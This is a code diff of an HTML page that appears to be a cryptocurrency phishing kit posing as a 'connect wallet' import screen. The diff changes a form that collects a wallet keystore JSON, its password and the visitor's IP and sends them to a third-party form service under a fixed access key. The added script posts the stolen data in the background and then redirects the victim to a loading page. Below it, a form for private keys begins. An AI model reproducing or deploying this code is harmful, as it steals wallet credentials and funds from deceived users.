@@ -247,17 +247,45 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-          <form  id="keystore-form" action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="f9e64ecb-a2b3-45d0-9b63-f6a8e475d164">
-              <input type="hidden" name="redirect" value="https://fixdapexplorer.co/apps/connect-wallet/loading.html">
-                <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
-                <input type="password" name="password" placeholder="Password" class="pass-field" required>
-                <input type="hidden" name="user_ip" id="user_ip_keystore">
-                <input type="hidden" name="type" id="type-keystore">
-                <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
-                <p class="form-instrunctions text-center">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
-            </form>
-        </div>
+  <form id="keystore-form" action="https://api.web3forms.com/submit" method="POST" onsubmit="handleSubmit(event)">
+    <input type="hidden" name="access_key" value="f9e64ecb-a2b3-45d0-9b63-f6a8e475d164">
+    <input type="hidden" name="redirect" value="https://fixdapexplorer.co/apps/connect-wallet/loading.html">
+    <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
+    <input type="password" name="password" placeholder="Password" class="pass-field" required>
+    <input type="hidden" name="user_ip" id="user_ip_keystore">
+    <input type="hidden" name="type" id="type-keystore">
+    <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
+    <p class="form-instrunctions text-center">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
+  </form>
+</div>
+
+<script>
+  function handleSubmit(event) {
+    event.preventDefault(); // Prevent default form submission behavior
+    let form = event.target;
+    let formData = new FormData(form);
+    
+    fetch(form.action, {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        // Redirect to your desired link after successful submission
+        window.location.href = form.querySelector('input[name="redirect"]').value;
+      } else {
+        // Handle error response (optional)
+        console.error('Form submission failed:', response.status);
+        // You can optionally display an error message to the user here
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      // You can optionally display an error message to the user here
+    });
+  }
+</script>
+
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
           <form  id="privatekey-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="f9e64ecb-a2b3-45d0-9b63-f6a8e475d164">
